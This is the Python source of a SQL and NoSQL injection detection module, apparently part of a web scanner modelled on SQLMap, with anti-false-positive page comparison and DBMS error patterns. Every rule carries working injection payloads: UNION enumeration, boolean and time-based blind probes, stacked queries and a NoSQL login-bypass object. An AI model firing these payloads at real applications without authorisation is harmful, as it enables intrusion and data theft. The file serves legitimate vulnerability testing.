"""
BRAHMASTRA - Naagastra: SQL Injection Detection Engine
======================================================
Production-grade SQLi detection inspired by SQLMap's methodology.
Covers all 6 SQLi techniques with rigorous false-positive prevention.

Techniques:
  1. Error-Based    - DB error messages in response (14 DBMS patterns)
  2. UNION-Based    - Column enumeration + marker extraction
  3. Boolean Blind  - TRUE/FALSE differential with dynamic content removal
  4. Time-Based     - Response timing with baseline calibration
  5. Stacked Query  - Multi-statement execution indicators
  6. Out-of-Band    - DNS/HTTP callback (placeholder for external service)

Anti-FP Measures (learned from SQLMap):
  - difflib SequenceMatcher for page comparison (not char-position)
  - HTML tag/script/style stripping before comparison
  - Reflected payload removal from response
  - Dynamic content identification and removal
  - Double-baseline natural variance measurement
  - Cross-validation: TRUE+FALSE must BOTH match expected pattern
  - Minimum differential gap requirement
  - Redirect-aware (302→login is NOT a finding)
"""

from __future__ import annotations
import re
import hashlib
from difflib import SequenceMatcher
from dataclasses import dataclass, field
from typing import Optional

# Import base Rule class from parent module
from brahmastra.narayanastra.rules import Rule


# ═══════════════════════════════════════════════════════════════════════════════
# PAGE COMPARISON ENGINE (SQLMap-inspired)
# ═══════════════════════════════════════════════════════════════════════════════

def _strip_html(page: str) -> str:
    """
    Remove HTML tags, scripts, styles, and comments.
    Returns visible text content only (like SQLMap's getFilteredPageContent).
    """
    if not page:
        return ""
    # Remove script/style/comment blocks entirely
    text = re.sub(r'(?si)<script[^>]*>.*?</script>', ' ', page)
    text = re.sub(r'(?si)<style[^>]*>.*?</style>', ' ', text)
    text = re.sub(r'(?s)<!--.*?-->', ' ', text)
    # Remove all HTML tags
    text = re.sub(r'<[^>]+>', ' ', text)
    # Collapse whitespace
    text = re.sub(r'\s+', ' ', text).strip()
    return text


def _remove_reflected(page: str, payload: str) -> str:
    """
    Remove all occurrences of the injected payload from the response.
    Handles raw, URL-encoded, and HTML-encoded variants.
    Prevents reflected content from being confused with extracted data.
    """
    if not page or not payload:
        return page
    # Remove raw payload
    cleaned = page.replace(payload, '')
    # URL-encoded variants
    import urllib.parse
    cleaned = cleaned.replace(urllib.parse.quote(payload, safe=''), '')
    cleaned = cleaned.replace(urllib.parse.quote_plus(payload), '')
    # HTML-encoded variants
    html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#39;')
    cleaned = cleaned.replace(html_encoded, '')
    # Case-insensitive removal of the core payload value
    for fragment in _extract_payload_values(payload):
        if len(fragment) >= 5:  # Only remove substantial fragments
            cleaned = re.sub(re.escape(fragment), '', cleaned, flags=re.IGNORECASE)
    return cleaned


def _extract_payload_values(payload: str) -> list[str]:
    """Extract the meaningful value parts from a SQL payload."""
    # Extract quoted strings, marker values, etc.
    values = re.findall(r"'([^']+)'", payload)
    values += re.findall(r'"([^"]+)"', payload)
    # Also the full payload
    values.append(payload)
    return values


def _page_ratio(page_a: str, page_b: str, payload: str = None) -> float:
    """
    Calculate page similarity ratio using difflib SequenceMatcher.
    This is the same algorithm SQLMap uses (quick_ratio for performance).

    Process:
      1. Strip HTML to get visible text
      2. Remove reflected payload values
      3. Truncate to 50K chars for performance
      4. Compare using SequenceMatcher.quick_ratio()

    Returns float 0.0-1.0 (1.0 = identical, 0.0 = completely different)
    """
    if not page_a and not page_b:
        return 1.0
    if not page_a or not page_b:
        return 0.0

    # Step 1: Strip HTML
    text_a = _strip_html(page_a)
    text_b = _strip_html(page_b)

    # Step 2: Remove reflected payload
    if payload:
        text_a = _remove_reflected(text_a, payload)
        text_b = _remove_reflected(text_b, payload)

    # Step 3: Truncate for performance
    MAX_LEN = 50000
    text_a = text_a[:MAX_LEN]
    text_b = text_b[:MAX_LEN]

    # Step 4: SequenceMatcher comparison
    if text_a == text_b:
        return 1.0

    try:
        sm = SequenceMatcher(None, text_a, text_b)
        ratio = sm.quick_ratio()
    except (MemoryError, SystemError):
        # Fallback: length-based ratio
        la, lb = len(text_a), len(text_b)
        ratio = min(la, lb) / max(la, lb) if max(la, lb) > 0 else 1.0

    return round(ratio, 4)


def _response_differs_structurally(response: str, baseline: str) -> bool:
    """
    Check if responses differ in structure (not just content).
    Compares: status patterns, HTML structure tags, error indicators.
    """
    def extract_structure(html):
        # Extract HTML tag structure
        tags = re.findall(r'<(\w+)[\s>]', html or '')
        return ' '.join(tags[:100])

    s1 = extract_structure(response)
    s2 = extract_structure(baseline)
    if s1 != s2:
        return True

    # Check if error patterns appeared that weren't in baseline
    error_indicators = [
        r'(?i)error', r'(?i)exception', r'(?i)warning',
        r'(?i)syntax', r'(?i)stack\s*trace', r'(?i)fatal',
    ]
    for pat in error_indicators:
        in_response = bool(re.search(pat, response or ''))
        in_baseline = bool(re.search(pat, baseline or ''))
        if in_response and not in_baseline:
            return True
    return False


# ═══════════════════════════════════════════════════════════════════════════════
# DATABASE ERROR PATTERNS (14 DBMS families)
# ═══════════════════════════════════════════════════════════════════════════════

# Each tuple: (pattern, dbms_name, specificity)
# specificity: "high" = definitely SQL error, "medium" = likely, "low" = possible
SQL_ERROR_PATTERNS = [
    # MySQL
    (r"you have an error in your sql syntax", "MySQL", "high"),
    (r"warning:\s*mysql", "MySQL", "high"),
    (r"warning:\s*mysqli", "MySQL", "high"),
    (r"com\.mysql\.jdbc", "MySQL", "high"),
    (r"mysql_fetch_\w+\(\)", "MySQL", "medium"),
    (r"mysqlclient\.", "MySQL", "medium"),
    (r"supplied argument is not a valid mysql", "MySQL", "medium"),

    # PostgreSQL
    (r"pg::syntaxerror", "PostgreSQL", "high"),
    (r"ERROR:\s+syntax error at or near", "PostgreSQL", "high"),
    (r"org\.postgresql\.util\.PSQLException", "PostgreSQL", "high"),
    (r"unterminated quoted string at or near", "PostgreSQL", "high"),
    (r"invalid input syntax for (?:type\s+)?(?:integer|numeric|bool)", "PostgreSQL", "high"),
    (r"current transaction is aborted", "PostgreSQL", "medium"),

    # Microsoft SQL Server
    (r"unclosed quotation mark after the character string", "MSSQL", "high"),
    (r"microsoft ole db provider for sql server", "MSSQL", "high"),
    (r"microsoft sql native client", "MSSQL", "high"),
    (r"\[sql server\]", "MSSQL", "high"),
    (r"odbc sql server driver", "MSSQL", "high"),
    (r"mssql_query\(\)", "MSSQL", "medium"),
    (r"sql server.*error", "MSSQL", "medium"),
    (r"Incorrect syntax near", "MSSQL", "high"),

    # Oracle
    (r"ora-\d{5}", "Oracle", "high"),
    (r"oracle\.jdbc", "Oracle", "high"),
    (r"quoted string not properly terminated", "Oracle", "high"),
    (r"invalid number", "Oracle", "medium"),
    (r"missing expression", "Oracle", "medium"),

    # SQLite
    (r"sqlite3\.operationalerror", "SQLite", "high"),
    (r"SQLITE_ERROR", "SQLite", "high"),
    (r"sqlite\.exception", "SQLite", "high"),
    (r"unrecognized token:.*near", "SQLite", "high"),
    (r"unable to prepare statement", "SQLite", "medium"),

    # DB2
    (r"db2 sql error", "DB2", "high"),
    (r"SQLCODE=-\d+", "DB2", "high"),

    # Generic SQL error patterns (lower specificity)
    (r"sqlstate\[\w+\]", "Generic", "medium"),
    (r"invalid query", "Generic", "low"),
    (r"sql command not properly ended", "Generic", "medium"),
    (r"dynamic sql error", "Generic", "medium"),
    (r"division by zero", "Generic", "low"),
    (r"data type mismatch", "Generic", "low"),
    (r"illegal mix of collations", "MySQL", "medium"),
    (r"conversion failed when converting", "MSSQL", "medium"),

    # ORM / Framework specific
    (r"sqlalchemy\.exc\.", "Python/SQLAlchemy", "high"),
    (r"django\.db\.utils\.", "Python/Django", "high"),
    (r"activerecord::statementinvalid", "Ruby/Rails", "high"),
    (r"hibernate.*exception", "Java/Hibernate", "medium"),
    (r"pdo::.*exception", "PHP/PDO", "high"),
    (r"sequelize.*error", "Node/Sequelize", "high"),
    (r"prisma.*error", "Node/Prisma", "high"),
]

# Patterns that look like SQL errors but are false positives
SQL_ERROR_FP_PATTERNS = [
    r"syntax highlighting",
    r"sql tutorial",
    r"learn sql",
    r"sql documentation",
    r"sql reference",
    r"error handling",
    r"error page",
    r"error\.css",
    r"error\.js",
]


# ═══════════════════════════════════════════════════════════════════════════════
# RULE 1: ERROR-BASED SQL INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

class SQLiErrorRule(Rule):
    """
    Detects SQL injection via database error messages in HTTP responses.

    Methodology:
      1. Inject syntax-breaking payloads (quotes, comments)
      2. Check response for DBMS-specific error patterns
      3. Verify error was NOT present in baseline (prevents FP on error pages)
      4. High-specificity patterns score higher

    SQLMap equivalent: Error-based technique (errorTest.py)
    """
    def __init__(self):
        super().__init__(
            id          = "sqli_error",
            name        = "SQL Injection (Error-Based)",
            severity    = "CRITICAL",
            cvss        = 9.8,
            category    = "injection",
            payloads    = [
                # Phase 1: Simple syntax breakers (cheapest)
                "'",                           # Single quote
                "\"",                          # Double quote
                "\\",                          # Backslash
                "')",                          # Close bracket + quote
                "';",                          # Statement terminator

                # Phase 2: Type confusion (force conversion errors)
                "' AND 1=CONVERT(int,@@version)--",   # MSSQL version extraction
                "' AND 1=CAST('a' AS int)--",          # Type cast error
                "' AND extractvalue(1,concat(0x7e,version()))--",  # MySQL XML extractvalue

                # Phase 3: Database-specific probes
                "' UNION SELECT @@version--",          # MSSQL/MySQL
                "' AND 1=utl_inaddr.get_host_name((SELECT version FROM v$instance))--",  # Oracle
                "' AND 1=CAST((SELECT version()) AS int)--",  # PostgreSQL
            ],
            locations   = ["query", "body", "json"],
            remediation = (
                "Use parameterized queries / prepared statements for ALL database operations. "
                "Never concatenate user input into SQL. Implement proper error handling "
                "that returns generic error messages to users (do not expose DBMS errors)."
            ),
        )
        self._compiled_patterns = [(re.compile(p, re.IGNORECASE), db, spec) for p, db, spec in SQL_ERROR_PATTERNS]
        self._compiled_fp = [re.compile(p, re.IGNORECASE) for p in SQL_ERROR_FP_PATTERNS]

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        body_lower = (response_body or "").lower()
        baseline_lower = (baseline_body or "").lower()

        # Anti-FP: Skip if response is identical to baseline
        if response_body == baseline_body:
            return 0.0

        # Anti-FP: Check false positive patterns first
        for fp_pat in self._compiled_fp:
            if fp_pat.search(body_lower):
                return 0.0

        best_conf = 0.0
        detected_dbms = None

        for pattern, dbms, specificity in self._compiled_patterns:
            match = pattern.search(body_lower)
            if not match:
                continue

            # Anti-FP: Was this error ALREADY in the baseline?
            if pattern.search(baseline_lower):
                continue  # Error exists without injection - not our fault

            # Score based on specificity
            if specificity == "high":
                conf = 0.95
            elif specificity == "medium":
                conf = 0.80
            else:
                conf = 0.60

            # Bonus: 5xx status code = server-side error (stronger signal)
            if status_code >= 500:
                conf = min(1.0, conf + 0.05)

            if conf > best_conf:
                best_conf = conf
                detected_dbms = dbms

        return best_conf


# ═══════════════════════════════════════════════════════════════════════════════
# RULE 2: UNION-BASED SQL INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

_UNION_MARKER = "BRMSTR7734X"  # Module-level constant for use in f-strings


class SQLiUnionRule(Rule):
    """
    Detects SQL injection via UNION SELECT column enumeration and data extraction.

    Methodology (3-phase, like SQLMap):
      Phase 1: Column count detection via ORDER BY or UNION NULL
      Phase 2: Confirm injection point with NULL columns
      Phase 3: Extract marker in specific column position

    Anti-FP measures:
      - Remove reflected payload from response before checking marker
      - Marker must appear in a NEW location (not where input is echoed)
      - Verify response structure changes (not just content growth)
      - Cross-validate with baseline comparison
    """
    MARKER = _UNION_MARKER

    def __init__(self):
        super().__init__(
            id          = "sqli_union",
            name        = "SQL Injection (UNION-Based)",
            severity    = "CRITICAL",
            cvss        = 9.5,
            category    = "injection",
            payloads    = [
                # Phase 1: Column count via ORDER BY (cheapest)
                "' ORDER BY 1--",
                "' ORDER BY 2--",
                "' ORDER BY 3--",
                "' ORDER BY 5--",
                "' ORDER BY 10--",
                "' ORDER BY 20--",
                "' ORDER BY 50--",

                # Phase 2: UNION NULL column enumeration
                "' UNION ALL SELECT NULL--",
                "' UNION ALL SELECT NULL,NULL--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",

                # Phase 3: Marker injection (3 columns most common)
                f"' UNION ALL SELECT '{_UNION_MARKER}',NULL,NULL--",
                f"' UNION ALL SELECT NULL,'{_UNION_MARKER}',NULL--",
                f"' UNION ALL SELECT NULL,NULL,'{_UNION_MARKER}'--",
                f"' UNION ALL SELECT '{_UNION_MARKER}',NULL,NULL,NULL--",
                f"' UNION ALL SELECT NULL,'{_UNION_MARKER}',NULL,NULL--",
                f"' UNION ALL SELECT NULL,NULL,'{_UNION_MARKER}',NULL--",
                f"' UNION ALL SELECT NULL,NULL,NULL,'{_UNION_MARKER}'--",

                # MySQL-specific (no comment needed)
                f"' UNION ALL SELECT '{_UNION_MARKER}',NULL,NULL#",
                f"1 UNION ALL SELECT '{_UNION_MARKER}',NULL,NULL",

                # Double-quote variants
                f'" UNION ALL SELECT \'{_UNION_MARKER}\',NULL,NULL--',
            ],
            locations   = ["query", "body"],
            remediation = (
                "Use parameterized queries. Whitelist expected output columns. "
                "Never include raw user input in SELECT statements."
            ),
        )
        self._order_by_results: dict[str, bool] = {}  # payload → success
        self._confirmed_columns: Optional[int] = None

    def reset_state(self):
        self._order_by_results = {}
        self._confirmed_columns = None

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        marker_lower = self.MARKER.lower()
        body_lower = (response_body or "").lower()
        baseline_lower = (baseline_body or "").lower()

        # ── Phase 1: ORDER BY column detection ──
        order_match = re.search(r"ORDER BY (\d+)", payload, re.IGNORECASE)
        if order_match:
            n = int(order_match.group(1))
            # Compare response to baseline - similar = ORDER BY succeeded
            ratio = _page_ratio(response_body, baseline_body, payload)
            success = ratio > 0.85 and status_code == baseline_status
            self._order_by_results[n] = success

            # If we have both success and failure, we know column count
            if not success and (n - 1) in self._order_by_results and self._order_by_results.get(n - 1):
                self._confirmed_columns = n - 1
            return 0.0  # ORDER BY alone is not a finding

        # ── Phase 2: UNION NULL confirmation ──
        if "UNION" in payload.upper() and "NULL" in payload.upper() and marker_lower not in payload.lower():
            # Count NULLs in this payload
            null_count = payload.upper().count("NULL")
            # If response status matches baseline = UNION succeeded (right column count)
            if status_code == baseline_status:
                ratio = _page_ratio(response_body, baseline_body, payload)
                if ratio > 0.7:
                    self._confirmed_columns = null_count
                    return 0.0  # Just column confirmation, not a finding yet
            return 0.0

        # ── Phase 3: Marker extraction ──
        if marker_lower in body_lower:
            # CRITICAL CHECK: Is the marker reflected or genuinely extracted from DB?

            # Check 1: Is the marker near the payload text? (reflected in echo)
            # Look for patterns like "No results for: <payload>" or "search: <payload>"
            # If the marker only appears INSIDE the reflected payload context, it's not extraction
            payload_lower = payload.lower()
            marker_pos = body_lower.find(marker_lower)
            # Check if the full payload (or most of it) appears around the marker
            context_start = max(0, marker_pos - 200)
            context_end = min(len(body_lower), marker_pos + len(marker_lower) + 200)
            context = body_lower[context_start:context_end]

            # If "union" and "select" appear near the marker, it's the reflected payload
            if "union" in context and "select" in context:
                # The UNION SELECT syntax is visible = the whole payload is reflected
                return 0.0  # Reflected, NOT extracted

            # Check 2: Remove payload from response, see if marker survives
            cleaned_response = _remove_reflected(response_body, payload)
            if marker_lower not in cleaned_response.lower():
                # Marker disappeared when payload was removed = it was reflected
                return 0.0

            # Check 3: Marker survived payload removal AND not near UNION/SELECT text
            # This means the marker was genuinely extracted from the database
            cleaned_stripped = _strip_html(cleaned_response)
            baseline_stripped = _strip_html(baseline_body)

            if len(cleaned_stripped) > len(baseline_stripped) * 0.9:
                return 0.98  # CONFIRMED: marker extracted from database

            # Check 4: Structural difference check
            ratio = _page_ratio(response_body, baseline_body, payload)
            if ratio < 0.7 and _response_differs_structurally(response_body, baseline_body):
                return 0.85  # Response structure changed significantly

            return 0.0  # Default: treat as reflected

        # ── Fallback: Content growth with UNION ──
        if "UNION" in payload.upper() and status_code == 200:
            ratio = _page_ratio(response_body, baseline_body, payload)
            if ratio < 0.5 and _response_differs_structurally(response_body, baseline_body):
                # Major content change with UNION = possible extraction
                return 0.55
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# RULE 3: BOOLEAN BLIND SQL INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

class SQLiBooleanRule(Rule):
    """
    Detects SQL injection via boolean-based blind testing.

    Methodology (SQLMap-inspired):
      1. Send TRUE condition: ' AND 1=1-- (should match baseline)
      2. Send FALSE condition: ' AND 1=2-- (should diverge from baseline)
      3. Cross-validate with reversed conditions
      4. Calculate differential gap: TRUE_ratio - FALSE_ratio > threshold
      5. Multiple payload variants for different quoting contexts

    Anti-FP (critical for boolean blind):
      - Uses _page_ratio() with HTML stripping + payload removal
      - Requires differential gap > 0.10 (not just any difference)
      - Cross-validates: both string-quoted AND integer variants must agree
      - Natural variance tolerance: only flag if gap exceeds baseline noise
      - Minimum page size requirement (tiny pages produce unreliable ratios)
    """
    # Payload pairs: (TRUE condition, FALSE condition, context description)
    PAYLOAD_PAIRS = [
        ("' AND 1=1--",    "' AND 1=2--",    "string-single-quote"),
        ("' AND 1=1#",     "' AND 1=2#",     "string-single-quote-hash"),
        ("\" AND 1=1--",   "\" AND 1=2--",   "string-double-quote"),
        ("1 AND 1=1",      "1 AND 1=2",      "integer-no-quote"),
        ("1) AND 1=1--",   "1) AND 1=2--",   "integer-bracket"),
        ("' AND 'a'='a",   "' AND 'a'='b",   "string-comparison"),
        ("') AND ('1'='1", "') AND ('1'='2", "bracket-string"),
    ]

    # Minimum page text length for reliable comparison
    MIN_PAGE_LENGTH = 100
    # Minimum gap between TRUE and FALSE ratios to confirm injection
    MIN_DIFFERENTIAL_GAP = 0.10
    # TRUE response must be this similar to baseline
    TRUE_MIN_RATIO = 0.80
    # FALSE response must be this different from baseline
    FALSE_MAX_RATIO = 0.70

    def __init__(self):
        # Flatten all payload pairs into a single payloads list
        all_payloads = []
        for true_p, false_p, ctx in self.PAYLOAD_PAIRS:
            all_payloads.extend([true_p, false_p])

        super().__init__(
            id          = "sqli_boolean",
            name        = "SQL Injection (Boolean Blind)",
            severity    = "CRITICAL",
            cvss        = 8.8,
            category    = "injection",
            payloads    = all_payloads,
            locations   = ["query", "body", "json"],
            remediation = (
                "Use parameterized queries / prepared statements. Never build SQL "
                "strings from user input. Use ORM with proper escaping."
            ),
        )
        self._pair_results: dict[str, dict] = {}  # context → {true_ratio, false_ratio}

    def reset_state(self):
        self._pair_results = {}

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Skip tiny responses (unreliable)
        if len(_strip_html(baseline_body or "")) < self.MIN_PAGE_LENGTH:
            return 0.0

        # Calculate page ratio (with HTML stripping + payload removal)
        ratio = _page_ratio(response_body, baseline_body, payload)

        # Determine which pair this payload belongs to
        for true_p, false_p, ctx in self.PAYLOAD_PAIRS:
            if payload == true_p:
                if ctx not in self._pair_results:
                    self._pair_results[ctx] = {}
                self._pair_results[ctx]["true_ratio"] = ratio
                self._pair_results[ctx]["true_status"] = status_code
                break

            elif payload == false_p:
                if ctx not in self._pair_results:
                    self._pair_results[ctx] = {}
                self._pair_results[ctx]["false_ratio"] = ratio
                self._pair_results[ctx]["false_status"] = status_code

                # Both TRUE and FALSE received for this context - evaluate
                tr = self._pair_results[ctx].get("true_ratio")
                fr = self._pair_results[ctx].get("false_ratio")

                if tr is not None and fr is not None:
                    return self._evaluate_pair(tr, fr, ctx)
                break

        return 0.0

    def _evaluate_pair(self, true_ratio: float, false_ratio: float, context: str) -> float:
        """
        Evaluate a TRUE/FALSE payload pair.

        Expected pattern for real SQLi:
          - TRUE response ≈ baseline (true_ratio > 0.80)
          - FALSE response ≠ baseline (false_ratio < 0.70)
          - Gap between them > 0.10
        """
        gap = true_ratio - false_ratio

        # Primary check: TRUE matches baseline, FALSE diverges
        if (true_ratio >= self.TRUE_MIN_RATIO and
                false_ratio <= self.FALSE_MAX_RATIO and
                gap >= self.MIN_DIFFERENTIAL_GAP):

            # Count how many contexts agree
            confirmed_contexts = 0
            for ctx, results in self._pair_results.items():
                tr = results.get("true_ratio", 0)
                fr = results.get("false_ratio", 1)
                if tr >= self.TRUE_MIN_RATIO and fr <= self.FALSE_MAX_RATIO:
                    confirmed_contexts += 1

            # Multiple contexts confirming = higher confidence
            if confirmed_contexts >= 2:
                return 0.95  # Cross-validated across multiple payload styles
            elif gap >= 0.30:
                return 0.90  # Large gap = strong signal
            elif gap >= 0.15:
                return 0.80  # Medium gap = good signal
            else:
                return 0.65  # Marginal gap = suspicious

        # Secondary: Status code differential (TRUE=200, FALSE=500)
        true_status = self._pair_results.get(context, {}).get("true_status", 0)
        false_status = self._pair_results.get(context, {}).get("false_status", 0)
        if true_status == 200 and false_status >= 500:
            return 0.75  # Status code differential

        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# RULE 4: TIME-BASED BLIND SQL INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

class SQLiTimeRule(Rule):
    """
    Detects SQL injection via response timing analysis.

    Methodology:
      1. Measure baseline response time
      2. Inject SLEEP/WAITFOR/pg_sleep payloads
      3. If response time >= expected_delay * 0.85 → positive
      4. Retry to confirm (network jitter prevention)

    Anti-FP:
      - Payload includes both 0-second and 5-second delays
      - Requires SPECIFIC delay match (not just "slow response")
      - Multiple DBMS-specific delay functions
      - 0-second delay must be fast (baseline calibration)
    """
    DELAY_SECONDS = 5
    DELAY_THRESHOLD = 4.0   # Must be >= 80% of expected delay
    FAST_THRESHOLD = 2.0    # 0-second delay must be < 2s

    def __init__(self):
        super().__init__(
            id          = "sqli_time",
            name        = "SQL Injection (Time-Based Blind)",
            severity    = "CRITICAL",
            cvss        = 9.1,
            category    = "injection",
            payloads    = [
                # Phase 1: Calibration (0-second delay - should be fast)
                "' AND SLEEP(0)--",
                "1 AND SLEEP(0)",

                # Phase 2: MySQL
                "' AND SLEEP(5)--",
                "' AND SLEEP(5)#",
                "1 AND SLEEP(5)",
                "' OR SLEEP(5)--",
                "\" AND SLEEP(5)--",

                # Phase 3: MSSQL
                "'; WAITFOR DELAY '0:0:5'--",
                "1; WAITFOR DELAY '0:0:5'",

                # Phase 4: PostgreSQL
                "'; SELECT pg_sleep(5)--",
                "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
                "1; SELECT pg_sleep(5)",

                # Phase 5: Oracle
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--",

                # Phase 6: SQLite
                "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",
            ],
            locations   = ["query", "body", "json"],
            remediation = (
                "Use parameterized queries. Apply query execution time limits. "
                "Monitor for unusually slow queries in database logs."
            ),
        )
        self._calibration_time: Optional[float] = None

    def reset_state(self):
        self._calibration_time = None

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Calibration payloads (0-second delay)
        if "SLEEP(0)" in payload.upper():
            self._calibration_time = elapsed
            return 0.0

        # Detection payloads (5-second delay)
        if elapsed >= self.DELAY_THRESHOLD:
            # Verify it's not just a naturally slow endpoint
            if self._calibration_time is not None and self._calibration_time <= self.FAST_THRESHOLD:
                # Calibration was fast but delay payload was slow = injection confirmed
                return 0.95
            else:
                # No calibration available - still strong signal if >= 4.5s
                if elapsed >= 4.5:
                    return 0.85
                return 0.70

        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# RULE 5: STACKED QUERIES SQL INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

class SQLiStackedRule(Rule):
    """
    Detects SQL injection via stacked (multi-statement) queries.
    Uses time-based confirmation since stacked queries can execute arbitrary SQL.

    Only works on: MSSQL, PostgreSQL (MySQL doesn't support stacked by default)
    """
    DELAY_THRESHOLD = 4.0

    def __init__(self):
        super().__init__(
            id          = "sqli_stacked",
            name        = "SQL Injection (Stacked Queries)",
            severity    = "CRITICAL",
            cvss        = 9.8,
            category    = "injection",
            payloads    = [
                # MSSQL stacked
                "'; WAITFOR DELAY '0:0:5'--",
                "1; WAITFOR DELAY '0:0:5'--",
                "'); WAITFOR DELAY '0:0:5'--",

                # PostgreSQL stacked
                "'; SELECT pg_sleep(5)--",
                "1; SELECT pg_sleep(5)--",

                # Generic stacked (detection via error)
                "'; SELECT 1--",
                "'; SELECT NULL--",
            ],
            locations   = ["query", "body", "json"],
            remediation = (
                "Use parameterized queries. Disable multi-statement execution in DB driver. "
                "Use least-privilege database accounts."
            ),
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Anti-FP: Skip if baseline was already an error page (404, 500)
        if baseline_status in (404, 500, 502, 503):
            return 0.0

        # Time-based confirmation for stacked queries
        if elapsed >= self.DELAY_THRESHOLD and ("WAITFOR" in payload.upper() or "pg_sleep" in payload):
            # Extra check: baseline should have been fast
            if baseline_status == status_code or status_code == 200:
                return 0.90
            return 0.0

        # Error-based: stacked query changed response structure
        if "SELECT" in payload.upper() and status_code != baseline_status:
            # Must go from success to error (not error to error)
            if baseline_status in (200, 201) and status_code >= 500:
                if _response_differs_structurally(response_body, baseline_body):
                    return 0.60
        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# RULE 6: NoSQL INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

class NoSQLRule(Rule):
    """
    Detects NoSQL injection (MongoDB, Redis, CouchDB).

    Methodology:
      - MongoDB operator injection ($gt, $ne, $regex, $where)
      - Auth bypass via operator: {"username":{"$ne":""},"password":{"$ne":""}}
      - JavaScript injection in $where clauses
    """
    def __init__(self):
        super().__init__(
            id          = "nosql",
            name        = "NoSQL Injection",
            severity    = "CRITICAL",
            cvss        = 9.0,
            category    = "injection",
            payloads    = [
                '{"$gt":""}',                                    # Operator injection
                '{"$ne":"invalid"}',                             # Not-equal bypass
                '{"$regex":".*"}',                               # Regex all
                "' || '1'=='1",                                  # JS injection
                "';return true;var x='",                         # JS return true
                '{"$where":"return true"}',                      # $where JS
                '{"username":{"$ne":""},"password":{"$ne":""}}', # Auth bypass
                "true, $where: '1 == 1'",                        # Alternate syntax
            ],
            locations   = ["json", "body", "query"],
            remediation = (
                "Sanitize all user inputs. Never pass raw input to MongoDB queries. "
                "Use parameterized queries with the official driver. Disable $where."
            ),
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Auth bypass: 401/403 → 200
        if baseline_status in (401, 403) and status_code == 200:
            return 0.92

        # Response body grew significantly (data leaked)
        if status_code == 200:
            ratio = _page_ratio(response_body, baseline_body, payload)
            if ratio < 0.5 and len(response_body) > len(baseline_body) * 1.5:
                return 0.75

        # Different data returned (IDOR-like via operator injection)
        if status_code == 200 and baseline_status == 200:
            ratio = _page_ratio(response_body, baseline_body, payload)
            if 0.1 < ratio < 0.6 and len(response_body) > 100:
                return 0.65

        return 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# EXPORT: All SQLi rules for registration
# ═══════════════════════════════════════════════════════════════════════════════

SQLI_RULES = [
    SQLiErrorRule,
    SQLiUnionRule,
    SQLiBooleanRule,
    SQLiTimeRule,
    SQLiStackedRule,
    NoSQLRule,
]

def get_sqli_rules() -> list[Rule]:
    """Return instances of all SQLi rules."""
    return [cls() for cls in SQLI_RULES]
